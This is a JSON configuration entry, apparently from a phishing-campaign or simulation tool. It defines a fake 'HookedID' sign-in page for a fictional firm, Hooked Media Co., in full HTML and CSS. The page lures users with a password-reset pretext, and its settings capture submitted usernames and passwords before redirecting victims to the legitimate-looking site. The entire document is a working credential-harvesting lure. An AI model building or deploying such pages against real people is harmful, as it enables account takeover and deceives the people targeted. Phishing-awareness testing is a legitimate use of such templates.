    {
      "name": "HookedID Sign In - Password Reset",
      "html": "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>HookedID - Sign In</title>\n<style>\n\t* { box-sizing: border-box; }\n\tbody {\n\t\tmargin: 0;\n\t\tmin-height: 100vh;\n\t\tdisplay: flex;\n\t\talign-items: center;\n\t\tjustify-content: center;\n\t\tbackground: linear-gradient(160deg, #eef2f7 0%, #dcefe9 100%);\n\t\tfont-family: -apple-system, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif;\n\t}\n\t.card {\n\t\twidth: 100%;\n\t\tmax-width: 400px;\n\t\tbackground: #ffffff;\n\t\tborder-radius: 12px;\n\t\tbox-shadow: 0 10px 40px rgba(15, 23, 42, 0.12);\n\t\tpadding: 40px 36px 32px;\n\t\tmargin: 24px;\n\t}\n\t.brand { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; }\n\t.brand-mark {\n\t\twidth: 32px; height: 32px; border-radius: 8px;\n\t\tbackground: linear-gradient(135deg, #0f766e, #0f3d3a);\n\t\tdisplay: flex; align-items: center; justify-content: center;\n\t\tflex-shrink: 0; color: #fff; font-weight: bold; font-size: 14px;\n\t}\n\t.brand-name { font-size: 15px; font-weight: 600; color: #0f172a; }\n\th1 { font-size: 20px; margin: 0 0 6px; color: #0f172a; }\n\t.subtitle { font-size: 13px; color: #64748b; margin: 0 0 24px; }\n\tlabel { display: block; font-size: 12px; font-weight: 600; color: #334155; margin-bottom: 6px; }\n\tinput {\n\t\twidth: 100%; padding: 10px 12px; border: 1px solid #cbd5e1;\n\t\tborder-radius: 6px; font-size: 14px; margin-bottom: 16px;\n\t}\n\tbutton {\n\t\twidth: 100%; padding: 11px; background: #0f766e; color: #fff;\n\t\tborder: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;\n\t}\n\t.footnote { margin-top: 18px; font-size: 11px; color: #94a3b8; text-align: center; }\n</style>\n</head>\n<body>\n\t<div class=\"card\">\n\t\t<div class=\"brand\">\n\t\t\t<div class=\"brand-mark\">H</div>\n\t\t\t<div class=\"brand-name\">Hooked Media Co.</div>\n\t\t</div>\n\t\t<h1>Sign in to HookedID</h1>\n\t\t<p class=\"subtitle\">Sign in to reset your password and restore access to your account.</p>\n\t\t<form method=\"post\">\n\t\t\t<label for=\"username\">Username or email</label>\n\t\t\t<input type=\"text\" name=\"username\" id=\"username\" placeholder=\"firstname.lastname@hookedmedia.example\">\n\t\t\t<label for=\"password\">Password</label>\n\t\t\t<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"••••••••\">\n\t\t\t<button type=\"submit\">Sign In</button>\n\t\t</form>\n\t\t<p class=\"footnote\">&copy; Hooked Media Co.. Having trouble? Contact the Service Desk.</p>\n\t</div>\n</body>\n</html>",
      "capture_credentials": true,
      "capture_passwords": true,
      "redirect_url": "https://hookedmedia.example",
      "redirect_mode": "url",
      "redirect_html": ""
    },
